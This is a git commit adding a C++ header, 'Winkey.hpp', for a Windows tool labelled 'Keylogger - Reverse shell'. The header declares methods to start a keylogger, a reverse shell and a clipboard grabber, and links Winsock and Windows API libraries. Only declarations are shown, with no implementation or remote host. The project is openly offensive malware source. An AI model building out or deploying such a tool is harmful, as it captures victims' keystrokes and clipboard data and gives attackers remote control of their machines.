1e539eba9ffd9cc4e22e5cf44cdb7e43f98edcb0
Dei Gott <dollyetal@proton.me>
2023-09-08 18:11:59 +0100

    Configuring remote shell, clipboard, keylogger.

---
+++ winkey/Winkey.hpp
@@ -0,0 +1,33 @@
+#ifndef WINKEY_HPP
+# define WINKEY_HPP
+
+# include <iostream>  // For standard I/O
+# include <winsock2.h> // For Winsock functions
+# include <windows.h>  // For Windows API functions
+#include <Tlhelp32.h>
+#include <time.h>
+#include <unordered_map>
+#include <cctype> // Include for std::toupper
+
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "User32.lib")
+
+
+// Keylogger - Reverse shell
+class Winkey {
+	public:
+		Winkey(void);
+		~Winkey(void);
+
+
+		void	startKeylogger();
+		void	startReverseShell();
+		void	startclipBoard(void);
+		//DWORD WINAPI _reverseShell(LPVOID lpParam);
+	private:
+		
+};
+
+#endif
